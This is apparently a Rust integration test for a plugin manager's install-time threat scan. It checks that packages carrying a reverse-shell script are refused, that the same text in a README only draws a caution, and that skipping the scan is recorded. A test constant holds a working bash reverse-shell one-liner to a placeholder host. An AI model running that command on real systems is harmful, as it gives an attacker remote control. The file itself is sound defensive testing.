//! The install-time threat scan (spec: plugin-system, Install-time threat
//! scan): `prometheus plugins install` of hostile and suspicious packages.

mod common;

use std::path::{Path, PathBuf};

use self::common::{ok, run, stderr, temp_home};

/// A plugin `p` (sample tool) with `extra` files, packed into
/// `<home>/p.pmtpkg`.
fn package(home: &Path, extra: &[(&str, &str)]) -> PathBuf {
    let dir = home.join("src/p");
    pmt_plugins::testkit::install("sample-tool", &dir);
    std::fs::write(
        dir.join("plugin.toml"),
        "manifest_version = 1\nid = \"p\"\nversion = \"1.0.0\"\nkind = \"wasm\"\n\
         description = \"p\"\nlicense = \"MIT\"\nrequires_prometheus = \"*\"\n\
         worlds = [\"tool@1.1\"]\n\n[capabilities]\n",
    )
    .unwrap();
    for (name, text) in extra {
        std::fs::write(dir.join(name), text).unwrap();
    }
    let out = home.join("p.pmtpkg");
    ok(&run(
        home,
        &[
            "plugins",
            "pack",
            dir.to_str().unwrap(),
            "--out",
            out.to_str().unwrap(),
        ],
    ));
    out
}

fn install(home: &Path, package: &Path, extra: &[&str]) -> std::process::Output {
    let mut args = vec![
        "plugins",
        "install",
        package.to_str().unwrap(),
        "--allow-unsigned",
    ];
    args.extend_from_slice(extra);
    run(home, &args)
}

fn installed(home: &Path) -> bool {
    home.join("profiles/default/plugins/p").exists()
}

const REVERSE_SHELL: &str = "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n";

#[test]
fn a_reverse_shell_is_blocked_even_with_force() {
    // Spec scenario "Reverse shell blocked even with force".
    let home = temp_home();
    let package = package(home.path(), &[("setup.sh", REVERSE_SHELL)]);
    let out = install(home.path(), &package, &["--force"]);
    assert_eq!(out.status.code(), Some(77), "{}", stderr(&out));
    assert!(
        stderr(&out).contains(
            "plugin 'p' was refused: threat scan verdict dangerous (reverse_shell in setup.sh:2)"
        ),
        "{}",
        stderr(&out)
    );
    assert!(!installed(home.path()));
}

#[test]
fn a_caution_verdict_needs_force_and_the_record_keeps_it() {
    // The same shell text in documentation is lowered to caution, but is
    // still reported.
    let home = temp_home();
    let package = package(home.path(), &[("README.md", REVERSE_SHELL)]);
    let out = install(home.path(), &package, &[]);
    assert_eq!(out.status.code(), Some(77), "{}", stderr(&out));
    assert!(
        stderr(&out).contains("caution reverse_shell in README.md:2"),
        "{}",
        stderr(&out)
    );
    assert!(!installed(home.path()));
    let out = install(home.path(), &package, &["--force"]);
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    let record =
        std::fs::read_to_string(home.path().join("profiles/default/plugins/p/.install.toml"))
            .unwrap();
    assert!(record.contains("forced = true"), "{record}");
}

#[test]
fn turning_the_scan_off_is_recorded_on_the_install() {
    let home = temp_home();
    let package = package(home.path(), &[("setup.sh", REVERSE_SHELL)]);
    ok(&run(
        home.path(),
        &["config", "set", "plugins.scan_on_install", "false"],
    ));
    let out = install(home.path(), &package, &[]);
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    let record =
        std::fs::read_to_string(home.path().join("profiles/default/plugins/p/.install.toml"))
            .unwrap();
    assert!(record.contains("scan_skipped = true"), "{record}");
}
